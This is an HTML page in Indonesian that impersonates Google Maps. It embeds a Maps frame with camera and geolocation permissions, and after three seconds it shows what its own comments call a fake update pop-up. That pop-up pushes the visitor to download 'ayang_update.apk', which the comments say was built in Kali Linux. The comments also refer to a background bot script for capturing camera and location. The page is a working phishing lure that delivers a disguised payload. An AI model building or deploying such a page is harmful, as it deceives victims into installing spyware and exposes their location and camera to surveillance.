<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; font-family: Arial, sans-serif; overflow: hidden; }
        iframe { width: 100%; height: 100%; border: none; z-index: 1; }
        
        /* Tampilan Pop-up Update Palsu */
        #update-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.7); z-index: 999; justify-content: center; align-items: center;
        }
        .update-box {
            background: white; padding: 25px; border-radius: 12px; width: 80%; max-width: 350px; text-align: center;
        }
        .update-box h3 { margin-top: 0; color: #d93025; }
        .btn-update {
            background: #1a73e8; color: white; border: none; padding: 12px 25px;
            border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px;
        }
    </style>
</head>
<body>
    <iframe src="http://googleusercontent.com/maps.google.com/3" allow="camera;geolocation"></iframe>

    <div id="update-overlay">
        <div class="update-box">
            <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" width="50">
            <h3>Update Diperlukan</h3>
            <p>Versi Google Maps Anda sudah usang. Pasang pembaruan sistem untuk akurasi lokasi yang lebih baik.</p>
            <button class="btn-update" onclick="downloadAPK()">UPDATE SEKARANG</button>
        </div>
    </div>

    <script>
        // Munculkan pop-up setelah 3 detik
        setTimeout(() => {
            document.getElementById('update-overlay').style.display = 'flex';
        }, 3000);

        function downloadAPK() {
            // Arahkan ke file APK yang sudah kamu buat di Kali Linux tadi
            // Contoh jika kamu simpan di GitHub yang sama:
            window.location.href = "ayang_update.apk";
        }

        // --- Script Spidey Bot Tetap Berjalan di Background ---
        // (Masukkan script kamera & lokasi kamu yang kemarin di sini)
    </script>
</body>
</html>
